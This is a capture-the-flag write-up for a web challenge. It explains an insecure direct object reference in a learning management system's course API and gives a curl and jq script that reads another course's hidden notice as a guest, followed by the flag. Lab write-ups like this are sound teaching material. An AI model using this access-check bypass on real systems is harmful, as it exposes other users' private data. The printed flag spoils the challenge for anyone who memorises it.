# Writeup
A learning management system (LMS). We can log in as a guest, but the flag is in a course notice we shouldn't be able to see. It's an IDOR.

After logging in as Guest, there's an API `/api/courses` that lists courses, and `/api/courses/<id>` that returns a single course detail. The detail endpoint doesn't check whether the guest is actually enrolled in that course, so we can just read any course by its id.

So: log in, list the courses, find the one we want ("情報セキュリティ特論"), and read its `.notice` field.

```bash
BASE="http://web.katagaitai-ctf.net/idor/step2"

# login as guest and keep the session cookie
curl -s -c /tmp/lms_cookie \
  -d 'username=Guest&password=guest' \
  "$BASE/login" > /dev/null

# find the course id, then read its notice (IDOR)
curl -s -b /tmp/lms_cookie "$BASE/api/courses" \
  | jq -r '.[] | select(.name | contains("情報セキュリティ特論")) | .id' \
  | while read -r id; do
      curl -s -b /tmp/lms_cookie "$BASE/api/courses/$id" | jq -r '.notice'
    done
```

The notice contains the final report submission keyword:

```
期末レポートの提出キーワード: katagaitai-CTF{U_c4nt_h1d3_4nym0r3}
```

The per-course detail endpoint trusts the id without an access check, so any logged-in user can read every course. Classic IDOR.

# flag
```
katagaitai-CTF{U_c4nt_h1d3_4nym0r3}
```
